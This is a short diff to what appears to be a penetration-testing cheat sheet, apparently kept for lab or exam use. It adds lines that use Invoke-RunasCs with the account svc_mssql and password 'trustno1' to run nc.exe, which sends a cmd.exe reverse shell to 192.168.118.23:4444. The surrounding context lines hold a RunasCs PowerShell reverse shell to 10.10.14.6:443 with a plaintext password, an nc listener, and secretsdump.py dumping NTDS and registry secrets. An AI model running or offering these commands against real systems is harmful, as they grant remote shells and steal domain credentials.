@@ -3734,6 +3734,10 @@ Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
  .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.6:443  
 rlwrap -cAr nc -lnvp 443
 
+# command run Invoke-RunasCs.ps1 to connect reverse shell
+import-module .\Invoke-RunasCs.ps1
+Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe'
+
 # command  use secretsdump.py to dump 
 secretsdump.py LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit
 
